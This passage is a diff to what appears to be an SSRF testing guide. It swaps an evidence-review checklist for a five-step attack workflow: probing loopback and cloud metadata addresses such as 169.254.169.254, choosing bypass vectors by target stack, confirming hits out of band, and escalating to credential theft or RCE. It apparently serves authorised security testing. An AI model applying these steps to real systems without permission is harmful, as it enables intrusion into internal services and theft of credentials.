-7. **Execution:** Did redirects, retries, background jobs, browsers, or agent tools receive the same policy?
-8. **Identity:** Which user, tenant, and service identity performed the operation?
-9. **Fix:** What shared control prevents recurrence across every network-capable code path?
-
-If an answer is unknown, mark it unknown. Do not replace missing evidence with assumptions, payload folklore, a model's narration, or an exaggerated impact claim.
+1. Confirm the obvious payloads are actually blocked (don't assume — test `127.0.0.1`, `localhost`, `169.254.169.254`, `[::1]` first).
+2. Work through Gate 0's four questions against the guard's actual implementation (source review if available — use Part 3 §3.1's path model — black-box inference otherwise).
+3. Pick vectors matching the target's stack: containerized → §4/§12; SSR framework → §10; edge/CDN-fronted → §6; service mesh → §7; "test connection" feature → §11; webhook/custom-header feature → §8; agentic/MCP → Part 3 §3.7.
+4. Always get OOB confirmation (Collaborator/interactsh) before reporting, even for these advanced vectors — and grade what tier of evidence (Part 3 §3.3) that confirmation actually gives you before calling it confirmed.
+5. Once OOB confirms the request fires, check §9 and §15 logic to see whether it escalates past "the server requested my URL" into credential theft, internal data read, or RCE — that's what separates a low/medium SSRF from a critical one.
